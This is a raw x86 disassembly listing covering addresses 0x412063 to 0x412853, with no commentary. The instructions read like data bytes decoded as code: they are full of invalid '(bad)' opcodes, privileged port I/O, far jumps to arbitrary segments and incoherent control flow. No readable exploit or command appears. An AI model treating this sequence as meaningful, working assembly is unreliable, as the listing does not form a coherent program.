  412063:	jae    0x41208d
  412065:	das    
  412066:	pushaw 
  412068:	loopne 0x4120b1
  41206a:	xor    al,0xd7
  41206c:	int3   
  41206d:	adc    eax,0x5acceeca
  412072:	push   esp
  412073:	popa   
  412074:	dec    ebp
  412075:	stos   DWORD PTR es:[edi],eax
  412076:	aaa    
  412077:	rcl    DWORD PTR [edi],cl
  412079:	fadd   DWORD PTR [esi+edx*4]
  41207c:	repz enter 0x5b40,0xc8
  412081:	cmp    dl,BYTE PTR [eax-0x65c2b1b6]
  412087:	jae    0x412010
  412089:	rcr    BYTE PTR ds:0xd23f8036,cl
  41208f:	adc    edx,DWORD PTR [ebp-0x2dc41c8a]
  412095:	mov    edi,0xee2fe4db
  41209a:	hlt    
  41209b:	retf   
  41209c:	pop    ss
  41209d:	jns    0x4120df
  41209f:	bnd ret 0x9f0d
  4120a3:	fld    QWORD PTR [ebx+0x11ca671b]
  4120a9:	lods   al,BYTE PTR ds:[esi]
  4120aa:	jmp    0x412071
  4120ac:	dec    ecx
  4120ad:	retf   
  4120ae:	ror    BYTE PTR [eax-0x1f266d74],1
  4120b4:	pop    esp
  4120b5:	addr16 mov ds:0x403c,al
  4120b9:	xchg   ebp,eax
  4120ba:	(bad)  [ebx+0x41]
  4120bd:	retf   0xc36e
  4120c0:	jg     0x4120d7
  4120c2:	jp     0x412079
  4120c4:	pusha  
  4120c5:	ss dec ecx
  4120c7:	jb     0x4120b1
  4120c9:	mov    WORD PTR ds:0xb84364f,cs
  4120cf:	adc    DWORD PTR ds:0x6ad15bc5,edi
  4120d5:	mov    esi,DWORD PTR [ecx-0x2f88080c]
  4120db:	pop    edi
  4120dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120dd:	jge    0x41214f
  4120df:	rcr    BYTE PTR [esi+0x1f],cl
  4120e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120e3:	sub    DWORD PTR [edi],0xffffffc6
  4120e6:	ins    DWORD PTR es:[edi],dx
  4120e7:	pop    edx
  4120e8:	inc    ebx
  4120e9:	cmp    al,bl
  4120eb:	scas   al,BYTE PTR es:[edi]
  4120ec:	jp     0x412125
  4120ee:	xchg   ebp,eax
  4120ef:	push   es
  4120f0:	xchg   ecx,esp
  4120f2:	xchg   edx,eax
  4120f3:	stos   DWORD PTR es:[edi],eax
  4120f4:	pop    edx
  4120f5:	xor    ch,dh
  4120f7:	jecxz  0x4120b3
  4120f9:	pop    esi
  4120fa:	es js  0x4120b1
  4120fd:	cmp    BYTE PTR [esi],al
  4120ff:	pop    ebp
  412100:	lods   al,BYTE PTR ds:[esi]
  412101:	or     eax,0x2ac8435
  412106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412107:	pusha  
  412108:	dec    ecx
  412109:	in     eax,dx
  41210a:	add    DWORD PTR ds:0x800fa58f,eax
  412110:	loop   0x41214d
  412112:	in     eax,0x98
  412114:	imul   ebp,DWORD PTR [ebx],0x1ab4ac98
  41211a:	sbb    ebp,edx
  41211c:	out    dx,eax
  41211d:	ins    DWORD PTR es:[edi],dx
  41211e:	inc    BYTE PTR [eax+0xce6c0a7]
  412124:	xchg   edi,eax
  412125:	pop    ebp
  412126:	sbb    eax,0x6b18cf01
  41212b:	jmp    0x4121a1
  41212d:	and    ecx,esp
  41212f:	pop    esi
  412130:	push   0x43d42ccf
  412135:	xchg   BYTE PTR [edx+ebp*8+0x6be28660],cl
  41213c:	fnsave [edx]
  41213e:	mov    esp,0xae7e95f8
  412143:	inc    edi
  412144:	pop    DWORD PTR [esi+0x7a]
  412147:	out    dx,eax
  412148:	sbb    BYTE PTR [ebp-0x3e],cl
  41214b:	and    DWORD PTR [eax-0x48adcd7c],0x76
  412152:	mov    bl,0xd
  412154:	(bad)  
  412155:	xchg   edx,eax
  412156:	or     ebp,DWORD PTR [ebp+ebx*4+0x484930b3]
  41215d:	xchg   esi,eax
  41215e:	fwait
  41215f:	add    DWORD PTR [eax+0x22d1653d],eax
  412165:	pop    ecx
  412166:	aad    0x8f
  412168:	loop   0x412113
  41216a:	or     BYTE PTR [ebp-0x42],ch
  41216d:	pop    edi
  41216e:	mov    bh,0xc
  412170:	test   eax,0x300ee69d
  412175:	push   DWORD PTR [esi-0x17]
  412178:	test   al,0x3e
  41217a:	cmp    eax,0x9cd9746c
  41217f:	sub    al,0x1b
  412181:	xchg   ebx,eax
  412182:	(bad)  
  412184:	in     eax,0x74
  412186:	mov    ch,BYTE PTR [ebp-0xabb08cd]
  41218c:	push   es
  41218d:	aad    0x60
  41218f:	scas   al,BYTE PTR es:[edi]
  412190:	or     eax,0xbfd5dc00
  412195:	(bad)  
  412196:	fsubr  st(7),st
  412198:	cs sub eax,0x2f6855f4
  41219e:	xlat   BYTE PTR ds:[ebx]
  41219f:	out    0xe1,al
  4121a1:	inc    ecx
  4121a2:	daa    
  4121a3:	pop    ecx
  4121a4:	mov    esi,0xec6f3980
  4121a9:	pushf  
  4121aa:	jmp    0x412165
  4121ac:	push   esp
  4121ad:	mov    al,0x8a
  4121af:	add    al,0x8f
  4121b1:	dec    ebx
  4121b2:	jl     0x4121ae
  4121b4:	xchg   bl,ah
  4121b6:	inc    edi
  4121b7:	mov    eax,0x146f2b05
  4121bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121bd:	sub    al,0xf1
  4121bf:	sahf   
  4121c0:	xchg   dh,cl
  4121c2:	cmp    DWORD PTR [ebp-0x5a57a92],0xffffffec
  4121c9:	rcl    DWORD PTR [ebx],1
  4121cb:	fmulp  st(7),st
  4121cd:	pop    ebx
  4121ce:	mov    esi,DWORD PTR [esi+0x30db21d0]
  4121d4:	or     bh,BYTE PTR [edx+0x6e]
  4121d7:	sbb    ebx,DWORD PTR [edx-0x6]
  4121da:	es jge 0x4121bd
  4121dd:	das    
  4121de:	add    ebx,esi
  4121e0:	xor    eax,0xb61b1857
  4121e5:	mov    ch,0xa
  4121e7:	mov    dh,0xc8
  4121e9:	je     0x412195
  4121eb:	sbb    al,0x2b
  4121ed:	mov    dl,0x1e
  4121ef:	push   cs
  4121f0:	or     ebx,esp
  4121f2:	sbb    BYTE PTR [ebp-0x6c],al
  4121f5:	test   eax,0xfa752ed
  4121fa:	mov    esp,DWORD PTR [edi]
  4121fc:	or     DWORD PTR [edx+0x16],esi
  4121ff:	dec    ebx
  412200:	icebp  
  412201:	adc    ah,BYTE PTR [eax]
  412203:	mov    ecx,DWORD PTR ds:0xfd531826
  412209:	loopne 0x41228a
  41220b:	push   esp
  41220c:	and    bl,BYTE PTR [eax-0x2f70edc9]
  412212:	loopne 0x4121d3
  412214:	xchg   esi,eax
  412215:	cwde   
  412216:	enter  0xb010,0x2d
  41221a:	jg     0x4121ca
  41221c:	xor    eax,0xb51d0636
  412221:	sbb    BYTE PTR [eax+0x4a],dl
  412224:	xor    BYTE PTR [ebp-0x181f5dfa],0x93
  41222b:	aas    
  41222c:	js     0x412260
  41222e:	cdq    
  41222f:	xor    al,0x30
  412231:	retf   
  412232:	inc    eax
  412233:	add    al,0x27
  412235:	test   eax,0x5b9f1311
  41223a:	leave  
  41223b:	and    DWORD PTR [ecx+eax*8+0x4e],esi
  41223f:	mov    ecx,0xa332ffec
  412244:	inc    ebx
  412245:	leave  
  412246:	es push ss
  412248:	test   eax,0x6ea574d8
  41224d:	push   edi
  41224e:	out    0x36,ax
  412251:	aam    0x8c
  412253:	ret    0xf88b
  412256:	xor    ebx,DWORD PTR [ecx]
  412258:	cdq    
  412259:	lods   al,BYTE PTR ds:[si]
  41225b:	test   eax,0xef248642
  412260:	cmc    
  412261:	cmp    al,0x36
  412263:	cdq    
  412264:	inc    edx
  412265:	sub    cl,BYTE PTR [edi]
  412267:	loopne 0x412296
  412269:	cmp    BYTE PTR [esi],bl
  41226b:	pop    edx
  41226c:	lds    eax,FWORD PTR [ecx-0x1f]
  41226f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412270:	inc    eax
  412271:	adc    al,0x9
  412273:	(bad)  
  412274:	lea    ecx,[edi+0x69d1b72]
  41227a:	dec    esp
  41227b:	sbb    ecx,DWORD PTR [ebp+eax*8-0x57f9eefa]
  412282:	mov    eax,ds:0xd01510dc
  412287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412288:	or     al,dl
  41228a:	xchg   ebp,eax
  41228b:	les    ebx,FWORD PTR [edx]
  41228d:	pop    esp
  41228e:	sub    al,0xaa
  412290:	lods   al,BYTE PTR ds:[esi]
  412291:	cld    
  412292:	inc    esp
  412293:	lock mov al,ds:0x4d45463
  412299:	in     al,dx
  41229a:	mov    bh,0xc2
  41229c:	imul   edx,ecx,0x3
  41229f:	and    eax,0x196f0a2e
  4122a4:	or     edx,DWORD PTR [esi]
  4122a6:	shr    DWORD PTR [ecx-0xc4fdc6f],1
  4122ac:	mov    bh,0x29
  4122ae:	xchg   DWORD PTR [ebx+0x17],ebp
  4122b1:	pop    edx
  4122b2:	jmp    0x4122c4
  4122b4:	cmp    eax,0x1cdb5aaa
  4122b9:	xchg   esp,eax
  4122ba:	ror    edx,0xce
  4122bd:	out    dx,al
  4122be:	adc    BYTE PTR [edi+0x5358328d],bl
  4122c4:	mov    WORD PTR [ebp-0x3],cs
  4122c7:	or     al,0xb1
  4122c9:	mov    dh,0xbf
  4122cb:	mov    ch,0xcd
  4122cd:	in     eax,dx
  4122ce:	pop    esi
  4122cf:	mov    ah,0x2d
  4122d1:	xchg   DWORD PTR [ebx],esi
  4122d3:	mov    al,ds:0xcb70b3f7
  4122d8:	pop    es
  4122d9:	in     eax,dx
  4122da:	outs   dx,BYTE PTR ds:[esi]
  4122db:	sub    ecx,ebx
  4122dd:	popa   
  4122de:	xor    BYTE PTR [edi-0x31],ah
  4122e1:	mov    DWORD PTR [esi],esi
  4122e3:	push   ecx
  4122e4:	mov    esi,0x5630802e
  4122e9:	mov    bl,0x55
  4122eb:	jl     0x41231b
  4122ed:	aaa    
  4122ee:	ret    
  4122ef:	ret    0x4017
  4122f2:	jns    0x412310
  4122f4:	mov    al,ds:0x13f2c6fb
  4122f9:	fldenv [ebx]
  4122fb:	push   es
  4122fc:	sbb    esp,esp
  4122fe:	pop    ds
  4122ff:	aaa    
  412300:	mov    ds:0xc5ef2a76,al
  412305:	cmp    eax,0xbb6505f6
  41230a:	fs imul ebp,esi,0xffffffb9
  41230e:	nop
  41230f:	mov    esp,0x80f250a5
  412314:	mov    ah,0xfd
  412316:	out    0x56,al
  412318:	or     dl,BYTE PTR [edi-0x13]
  41231b:	inc    edi
  41231c:	mov    cs:0x443bb71c,eax
  412322:	mov    al,0xd6
  412324:	ds (bad) 
  412326:	pop    esp
  412327:	scas   al,BYTE PTR es:[edi]
  412328:	pcmpeqw mm1,mm1
  41232b:	push   ds
  41232c:	jne    0x41230d
  41232e:	and    ebx,eax
  412330:	pop    ss
  412331:	out    dx,eax
  412332:	outs   dx,DWORD PTR ds:[esi]
  412333:	mov    eax,0xa2bba81
  412338:	mov    DWORD PTR [edx+0x8e74d72],ebx
  41233e:	fst    DWORD PTR [ecx]
  412340:	neg    DWORD PTR [eax]
  412342:	add    al,dl
  412344:	cmp    al,0x67
  412346:	ja     0x412305
  412348:	mov    dl,0xc6
  41234a:	sub    al,BYTE PTR [edi-0x213e2b1e]
  412350:	bnd ret 0x5f83
  412354:	int    0x25
  412356:	and    DWORD PTR [esi+0x33c8d38b],edi
  41235c:	mov    al,0x37
  41235e:	cli    
  41235f:	inc    ebx
  412360:	mov    dl,0x50
  412362:	and    DWORD PTR [edi+0x1176ec7c],0x2ed31065
  41236c:	addr16 loop 0x4122f9
  41236f:	mov    esp,0xbb89d638
  412374:	add    DWORD PTR [ecx-0x1a6bd739],edx
  41237a:	nop
  41237b:	rol    DWORD PTR [edi-0x46],0x16
  41237f:	mov    ebx,0xee058abe
  412384:	and    eax,0x1ccfa3ea
  412389:	pop    es
  41238a:	add    bh,cl
  41238c:	fbld   TBYTE PTR [edx+edx*8]
  41238f:	push   ecx
  412390:	sbb    cl,BYTE PTR [edx+0x36293239]
  412396:	jns    0x41238b
  412398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412399:	xor    DWORD PTR [edx],edi
  41239b:	daa    
  41239c:	rcr    DWORD PTR [edx-0x48484de],cl
  4123a2:	addr16 gs and al,dh
  4123a6:	jmp    0x41236c
  4123a8:	push   eax
  4123a9:	cmp    ebp,0x9695d542
  4123af:	jb     0x412358
  4123b1:	mov    edi,edx
  4123b3:	sub    edx,DWORD PTR [edx]
  4123b5:	fsub   QWORD PTR [edx-0xf]
  4123b8:	cmc    
  4123b9:	scas   al,BYTE PTR es:[edi]
  4123ba:	mov    dh,0x52
  4123bc:	popa   
  4123bd:	jnp    0x412372
  4123bf:	jmp    0xfffc:0x7d9f3961
  4123c6:	mov    al,ds:0xc522d77f
  4123cb:	add    bh,BYTE PTR [ebx+0x703d17ba]
  4123d1:	retf   
  4123d2:	mov    al,0x89
  4123d4:	das    
  4123d5:	repnz sbb ch,BYTE PTR [esi-0x12e51bc2]
  4123dc:	fisubr WORD PTR [esi+0x566e9945]
  4123e2:	and    BYTE PTR [ecx-0xd],ch
  4123e5:	mov    al,ds:0x6de4cd38
  4123ea:	sar    BYTE PTR fs:[edi],0xe6
  4123ee:	jmp    0x776bb59d
  4123f3:	sub    dl,ch
  4123f5:	(bad)  [edx+0x451cf25]
  4123fb:	and    ah,bl
  4123fd:	mov    ds:0x4c17d8df,al
  412402:	lahf   
  412403:	jmp    0x4123f4
  412405:	ss dec ebx
  412407:	callw  0xb706
  41240b:	sar    DWORD PTR [edi-0x1b],1
  41240e:	and    eax,0x608c49e4
  412413:	imul   ecx,DWORD PTR [edx-0x3bb54862],0x66
  41241a:	in     al,0x8
  41241c:	(bad)  
  41241d:	xor    al,0x6c
  41241f:	push   0xfdce820a
  412424:	sar    DWORD PTR [ecx+0xd949b9f],cl
  41242a:	pop    ds
  41242b:	lea    ebp,[eax]
  41242d:	pop    edx
  41242e:	ja     0x4123ff
  412430:	dec    eax
  412431:	scas   eax,DWORD PTR es:[edi]
  412432:	sub    BYTE PTR [eax+0x128c803d],0x80
  412439:	xor    eax,0xc803a6bb
  41243e:	stos   BYTE PTR es:[edi],al
  41243f:	sbb    al,0xdb
  412441:	add    ah,bl
  412443:	retf   0x6eaf
  412446:	leave  
  412447:	add    al,0xe9
  412449:	enter  0xf294,0x12
  41244d:	push   ebx
  41244e:	sti    
  41244f:	mov    eax,0x2f7c1ead
  412454:	shr    BYTE PTR [ebx+0x77721e8],cl
  41245a:	push   ss
  41245b:	pop    esp
  41245c:	mov    al,0xc3
  41245e:	scas   eax,DWORD PTR es:[edi]
  41245f:	xchg   BYTE PTR [ecx-0x4ac65fa5],al
  412465:	lea    eax,[edx+0x13a3b818]
  41246b:	rcr    BYTE PTR [eax],0x61
  41246e:	or     cl,BYTE PTR [ecx-0x62e1efe8]
  412474:	xor    dh,BYTE PTR [edx+ecx*1+0x29]
  412478:	sbb    esp,0x3e
  41247b:	cmp    bh,cl
  41247d:	xchg   ecx,eax
  41247e:	cmp    al,0xd5
  412480:	cmp    eax,0x657dfe4f
  412485:	and    al,0x33
  412487:	stc    
  412488:	dec    esp
  412489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41248a:	out    dx,al
  41248b:	xchg   DWORD PTR [edx+0x6a969391],eax
  412491:	cmp    bh,BYTE PTR [eax+ecx*8]
  412494:	scas   eax,DWORD PTR es:[edi]
  412495:	add    al,0xb
  412497:	gs aas 
  412499:	push   0x9c720083
  41249e:	xchg   edx,eax
  41249f:	pmaddwd mm2,mm6
  4124a2:	jmp    0x6dfd:0xfde63183
  4124a9:	add    al,0xbc
  4124ab:	sbb    dh,bl
  4124ad:	ins    BYTE PTR es:[edi],dx
  4124ae:	push   es
  4124af:	call   0xae468a5e
  4124b4:	pop    esp
  4124b5:	cmp    cl,BYTE PTR [ecx]
  4124b7:	ins    DWORD PTR es:[edi],dx
  4124b8:	mov    eax,ebp
  4124ba:	jne    0x4124f0
  4124bc:	cmp    eax,DWORD PTR [edx]
  4124be:	pop    ebp
  4124bf:	popf   
  4124c0:	inc    ecx
  4124c1:	push   ds
  4124c2:	pusha  
  4124c3:	std    
  4124c4:	push   ecx
  4124c5:	jmp    0x6cb5:0x2af7682
  4124cc:	sbb    al,0x11
  4124ce:	icebp  
  4124cf:	sbb    ecx,ebx
  4124d1:	jns    0x4124db
  4124d3:	cwde   
  4124d4:	or     eax,0xebaf848c
  4124d9:	inc    edi
  4124da:	and    DWORD PTR [eax],ebx
  4124dc:	push   ecx
  4124dd:	repnz pop ds
  4124df:	pop    ebx
  4124e0:	stos   BYTE PTR es:[edi],al
  4124e1:	mov    esp,0x5754d63f
  4124e6:	mov    esp,0x1e012ccd
  4124eb:	ror    BYTE PTR [eax-0xdfd630d],cl
  4124f1:	shl    BYTE PTR [eax-0x7],cl
  4124f4:	add    ebx,DWORD PTR [eax-0x11]
  4124f7:	xor    dh,al
  4124f9:	test   edx,esi
  4124fb:	cmp    ch,BYTE PTR [ecx]
  4124fd:	fs sti 
  4124ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412500:	iret   
  412501:	bound  ecx,QWORD PTR [ecx+0x75]
  412504:	inc    edx
  412505:	pop    esi
  412506:	jb     0x412582
  412508:	in     eax,0x8f
  41250a:	sbb    BYTE PTR [eax],cl
  41250c:	xor    eax,0xba1482c4
  412511:	sbb    ecx,ebp
  412513:	pop    ebx
  412514:	mov    al,ds:0xd77c9ae2
  412519:	mov    ebp,0x42173e9e
  41251e:	xchg   ecx,eax
  41251f:	vmwrite esi,esi
  412522:	push   eax
  412523:	int3   
  412524:	les    esi,FWORD PTR [edi-0x48]
  412527:	iret   
  412528:	in     eax,0x7c
  41252a:	in     eax,dx
  41252b:	inc    edx
  41252c:	out    0xa1,al
  41252e:	cmp    cl,dl
  412530:	test   al,0x68
  412532:	scas   eax,DWORD PTR es:[edi]
  412533:	mov    bh,BYTE PTR [ebp+0x71]
  412536:	cmp    dl,BYTE PTR [ecx+edi*2]
  412539:	retf   
  41253a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41253b:	popf   
  41253c:	dec    ecx
  41253d:	fcom   DWORD PTR [ebx+0x7884dbe7]
  412543:	repz xchg ebp,eax
  412545:	inc    edx
  412546:	mov    eax,0xfbd7e3b1
  41254b:	je     0x4124f8
  41254d:	shl    eax,cl
  41254f:	shl    BYTE PTR ds:0x3ac2b246,0x20
  412556:	call   0x1085:0x65171679
  41255d:	test   cl,dl
  41255f:	sbb    cl,BYTE PTR [edx]
  412561:	ja     0xe14434ca
  412567:	mov    eax,ds:0x232f800b
  41256c:	lea    ebp,[esi]
  41256e:	or     edi,DWORD PTR [esi-0x4752003d]
  412574:	xlat   BYTE PTR ds:[ebx]
  412575:	sbb    edi,edi
  412577:	(bad)  
  412578:	xchg   ebp,eax
  412579:	cwde   
  41257a:	in     eax,dx
  41257b:	push   es
  41257c:	adc    DWORD PTR [edx+0x7aa12417],ebp
  412582:	shl    DWORD PTR [ebp+0x66],1
  412585:	pusha  
  412586:	push   es
  412587:	add    BYTE PTR [ecx-0x35],dl
  41258a:	xchg   edi,eax
  41258b:	ffree  st(0)
  41258d:	inc    ebp
  41258e:	test   bl,dh
  412590:	and    al,0x74
  412592:	nop
  412593:	mov    ecx,0xf99e258a
  412598:	jp     0x41251e
  41259a:	add    DWORD PTR ds:0x3558b17e,ebx
  4125a0:	inc    edx
  4125a1:	in     eax,0x6e
  4125a3:	loop   0x41259b
  4125a5:	test   al,0x5a
  4125a7:	aam    0xe5
  4125a9:	push   edi
  4125aa:	sbb    edi,eax
  4125ac:	enter  0x8121,0x19
  4125b0:	pop    esp
  4125b1:	mov    bh,0xfc
  4125b3:	shl    BYTE PTR [edi+0x6552a7b8],cl
  4125b9:	cmp    BYTE PTR [ecx],ah
  4125bb:	ret    0x6a12
  4125be:	loop   0x4125b7
  4125c0:	imul   edx,edx,0xc525d1e
  4125c6:	js     0x412641
  4125c8:	mov    dl,0x1e
  4125ca:	push   esp
  4125cb:	leave  
  4125cc:	cli    
  4125cd:	cwde   
  4125ce:	xor    al,0x81
  4125d0:	add    eax,0x5946cf46
  4125d5:	ds and al,0xf7
  4125d8:	jmp    FWORD PTR [esi]
  4125da:	test   eax,0x8607788
  4125df:	stos   DWORD PTR es:[edi],eax
  4125e0:	sbb    DWORD PTR [ebp+esi*8+0x78a9aa00],ebx
  4125e7:	push   es
  4125e8:	jecxz  0x41260b
  4125ea:	push   0xb03429dc
  4125ef:	dec    ebp
  4125f0:	and    al,0x5f
  4125f2:	pop    sp
  4125f4:	and    BYTE PTR [ecx+eax*1-0x7b98e2d5],dh
  4125fb:	adc    eax,0x89011704
  412600:	outs   dx,BYTE PTR ds:[esi]
  412601:	or     eax,0x79aa8d38
  412606:	popa   
  412607:	push   esp
  412608:	xchg   edx,eax
  412609:	mov    dh,0x96
  41260b:	and    bh,BYTE PTR [esi]
  41260d:	mov    bh,0xd0
  41260f:	iret   
  412610:	xchg   esi,eax
  412611:	(bad)  
  412612:	fdiv   QWORD PTR [edi]
  412614:	inc    esi
  412615:	push   esi
  412616:	outs   dx,DWORD PTR ds:[esi]
  412617:	push   edi
  412618:	and    BYTE PTR [ebx+0x35],dl
  41261b:	loope  0x4125b6
  41261d:	je     0x4125c2
  41261f:	fidiv  WORD PTR [ebp-0x6cd85c4a]
  412625:	aam    0x49
  412627:	fst    QWORD PTR [edi]
  412629:	fwait
  41262a:	jne    0x412688
  41262c:	jo     0x412622
  41262e:	bnd jmp 0x1a898e51
  412634:	jge    0x412690
  412636:	sbb    eax,0x878c7b83
  41263b:	outs   dx,DWORD PTR ds:[esi]
  41263c:	push   esi
  41263d:	inc    ebp
  41263e:	jbe    0x4126b0
  412640:	adc    DWORD PTR [edx+0x624cf6ce],ebx
  412646:	std    
  412647:	mov    ebx,0x6714b997
  41264c:	test   eax,0x58840688
  412651:	jmp    0x6909:0x16814c8
  412658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412659:	cmp    edi,DWORD PTR [edx+0x7d39c420]
  41265f:	out    dx,al
  412660:	in     al,0x84
  412662:	mov    DWORD PTR [esi-0x2c],ebx
  412665:	cmp    ch,bl
  412667:	je     0x412672
  412669:	jmp    0xcf435e8
  41266e:	dec    ebx
  41266f:	clc    
  412670:	lea    ebp,[ebp-0x7b]
  412673:	stc    
  412674:	nop
  412675:	mov    al,0x29
  412677:	jne    0x41267f
  412679:	aas    
  41267a:	jmp    0xb3b8:0x6e783708
  412681:	lods   al,BYTE PTR ds:[esi]
  412682:	and    eax,0xd6f440b4
  412687:	pop    eax
  412688:	xchg   esi,eax
  412689:	adc    DWORD PTR [ebx-0x4d],esi
  41268c:	or     ecx,DWORD PTR [eax+0x214f2818]
  412692:	mov    ch,0x9c
  412694:	(bad)  
  412695:	scas   eax,DWORD PTR es:[edi]
  412696:	hlt    
  412697:	jbe    0x4126a5
  412699:	mov    BYTE PTR ds:0x9983538c,bh
  41269f:	icebp  
  4126a0:	inc    edx
  4126a1:	into   
  4126a2:	cld    
  4126a3:	xchg   DWORD PTR [eax-0x6d],ebx
  4126a6:	xchg   edi,eax
  4126a7:	(bad)
  4126ab:	or     al,BYTE PTR [ebp+0x1ee4c54c]
  4126b1:	sar    cl,cl
  4126b3:	inc    ecx
  4126b4:	dec    ebx
  4126b5:	enter  0xe524,0xf7
  4126b9:	fst    QWORD PTR [ecx+0x46]
  4126bc:	sub    al,0x6c
  4126be:	(bad)  
  4126bf:	mov    ah,0xde
  4126c1:	jl     0x4126b9
  4126c3:	(bad)  
  4126c4:	int3   
  4126c5:	lahf   
  4126c6:	cmp    esi,DWORD PTR [ebp+0x3b]
  4126c9:	mov    eax,ds:0x929855e5
  4126ce:	dec    esp
  4126cf:	addr16 das 
  4126d1:	ins    DWORD PTR es:[edi],dx
  4126d2:	in     eax,dx
  4126d3:	fisttp DWORD PTR [ecx]
  4126d5:	add    al,0x47
  4126d7:	dec    edi
  4126d8:	sub    al,0xec
  4126da:	or     dh,ah
  4126dc:	call   0xb9c3c674
  4126e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126e2:	fst    DWORD PTR [ebx+0x71]
  4126e5:	pusha  
  4126e6:	aam    0xf3
  4126e8:	xchg   ecx,eax
  4126e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ea:	sub    BYTE PTR [eax+0x48a981bb],dl
  4126f0:	pop    ss
  4126f1:	add    eax,0x5da2532e
  4126f6:	add    BYTE PTR [ecx+0x67],dl
  4126f9:	mov    ch,0x2e
  4126fb:	xor    ah,cl
  4126fd:	jb     0x41276f
  4126ff:	loope  0x41272a
  412701:	push   eax
  412702:	mov    al,0x77
  412704:	mov    ?,WORD PTR [edx]
  412706:	jb     0x4126f5
  412708:	add    ch,ch
  41270a:	scas   al,BYTE PTR es:[edi]
  41270b:	sub    eax,0xda072f09
  412710:	fcom   QWORD PTR [edi+0x63e6e11a]
  412716:	mov    bl,0x5e
  412718:	cmp    BYTE PTR [ebp+0x6a],bl
  41271b:	xlat   BYTE PTR ds:[ebx]
  41271c:	inc    ebx
  41271d:	stos   DWORD PTR es:[edi],eax
  41271e:	ss or  ebp,0x34
  412722:	cmp    eax,0xc6b29b5a
  412727:	ret    
  412728:	adc    DWORD PTR [ecx],ebx
  41272a:	add    DWORD PTR [ebp+0x4a],ecx
  41272d:	add    al,0x76
  41272f:	add    al,0x18
  412731:	adc    al,0xf8
  412733:	cmp    ah,bl
  412735:	lock mov edi,0xe215373
  41273b:	add    ch,BYTE PTR [eax]
  41273d:	jl     0x41279d
  41273f:	and    eax,0xea9c0174
  412744:	pop    ss
  412745:	ins    BYTE PTR es:[edi],dx
  412746:	scas   al,BYTE PTR es:[edi]
  412747:	pop    ds
  412748:	sub    ebp,DWORD PTR [ebp-0x1a]
  41274b:	jne    0x4127c3
  41274d:	xchg   esi,eax
  41274e:	sub    DWORD PTR [edi+0x13],edx
  412751:	stos   DWORD PTR es:[edi],eax
  412752:	sbb    al,bh
  412754:	xlat   BYTE PTR ds:[ebx]
  412755:	dec    ebx
  412756:	setno  dl
  412759:	call   0x3824:0x4269de6
  412760:	xor    al,bl
  412762:	test   BYTE PTR [edi+0xb0d9939],bl
  412768:	mov    ds:0xa585cbcd,al
  41276d:	jmp    0xd94c4b0d
  412772:	inc    edi
  412773:	pop    ds
  412774:	pop    ds
  412775:	loope  0x412739
  412777:	loope  0x4127b3
  412779:	or     BYTE PTR [ebx],al
  41277b:	std    
  41277c:	mov    esp,DWORD PTR [esi]
  41277e:	mov    bl,0x82
  412780:	lea    ebp,[ebx-0x5378e840]
  412786:	in     al,dx
  412787:	(bad)  
  412788:	jne    0x41272c
  41278a:	adc    cl,ch
  41278c:	jnp    0x412801
  41278e:	push   esp
  41278f:	push   eax
  412790:	fucomip st,st(1)
  412792:	les    ecx,FWORD PTR [ebp+0x5c]
  412795:	jo     0x412743
  412797:	bswap  ecx
  412799:	cmp    BYTE PTR [esi-0x3d7bddf7],al
  41279f:	sbb    esp,DWORD PTR [ecx]
  4127a1:	jmp    0x1be09152
  4127a6:	mov    ebp,0x9a899142
  4127ab:	push   cs
  4127ac:	cld    
  4127ad:	adc    dl,BYTE PTR [edi]
  4127af:	or     eax,0xc1628138
  4127b4:	xchg   edx,eax
  4127b5:	int3   
  4127b6:	mov    dl,0x86
  4127b8:	loope  0x412802
  4127ba:	test   al,0xe0
  4127bc:	and    ah,BYTE PTR [edx+0x264746b6]
  4127c2:	adc    eax,0xdc459149
  4127c7:	rol    edi,0xfb
  4127ca:	pop    ecx
  4127cb:	int3   
  4127cc:	ds call 0xe878:0x8c15e16f
  4127d4:	pop    ebx
  4127d5:	push   eax
  4127d6:	bound  esi,QWORD PTR [ecx+ecx*8+0x4f]
  4127da:	mov    al,BYTE PTR [esi-0x54309abe]
  4127e0:	jecxz  0x41277c
  4127e2:	mov    edi,0xb82951
  4127e7:	into   
  4127e8:	in     al,dx
  4127e9:	push   0xffffff93
  4127eb:	pop    ss
  4127ec:	icebp  
  4127ed:	call   0xf0ea:0x7c868905
  4127f4:	xchg   edi,eax
  4127f5:	inc    ebp
  4127f6:	mov    DWORD PTR [edi],esi
  4127f8:	retf   0x3d2c
  4127fb:	fs fld st(1)
  4127fe:	push   cs
  4127ff:	xor    eax,0x1b99d120
  412804:	jne    0x4127dc
  412806:	addr16 pop ecx
  412808:	daa    
  412809:	mov    eax,0x56c8df57
  41280e:	scas   al,BYTE PTR es:[edi]
  41280f:	inc    edx
  412810:	popf   
  412811:	xchg   BYTE PTR [edi],al
  412813:	push   ss
  412814:	push   eax
  412815:	sar    BYTE PTR [eax+0xec23ae7],0x63
  41281c:	jbe    0x412852
  41281e:	iret   
  41281f:	repnz fsubrp st(6),st
  412822:	cld    
  412823:	fucom  st(5)
  412825:	jmp    0xd53d:0xbf2f5d34
  41282c:	mov    dl,0x6a
  41282e:	push   eax
  41282f:	aad    0x69
  412831:	sbb    al,0xb8
  412833:	push   cs
  412834:	fsubr  QWORD PTR [ebx]
  412836:	adc    DWORD PTR [edi+0x20e1e6a3],eax
  41283c:	inc    ebx
  41283e:	adc    al,0xf4
  412840:	pop    edx
  412841:	scas   al,BYTE PTR es:[edi]
  412842:	mov    bl,0xa0
  412844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412845:	std    
  412846:	sub    dh,BYTE PTR [ecx-0x3a]
  412849:	iret   
  41284a:	jle    0x4127e6
  41284c:	or     edx,0xffd9654f
  412852:	inc    ecx
  412853:	mov    ecx,0x7d0172d0
